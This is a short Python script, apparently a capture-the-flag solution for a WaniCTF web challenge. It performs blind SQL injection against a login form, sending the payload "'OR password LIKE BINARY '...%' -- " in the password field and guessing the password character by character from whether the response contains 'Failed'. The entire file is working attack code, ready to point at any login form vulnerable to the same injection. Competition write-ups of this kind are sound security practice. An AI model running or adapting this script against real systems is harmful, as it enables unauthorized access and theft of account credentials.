import requests

def attack(ans):
    url = 'https://watch.web.wanictf.org/'
    
    cs = list(map(str, range(10)))
    cs += [chr(0x41 + i) for i in range(26)]
    cs += [chr(0x61 + i) for i in range(26)]
    cs += ['_', '-', '.', '$', '@', '!', '?', '{', '}']
    
    for c in cs:
        data = {'email': 'wanictf21spring@gmail.com', 'password': "'OR password LIKE BINARY '{}%' -- ".format(ans + c)}

        ret = requests.post(url, data=data)
        print(data)

        # print('Failed' in ret.text, len(ret.text))
        if not 'Failed' in ret.text:
            ans += c
            return ans

if __name__ == "__main__":
    ans = ''

    while True:
        ans = attack(ans)
        print('password:', ans)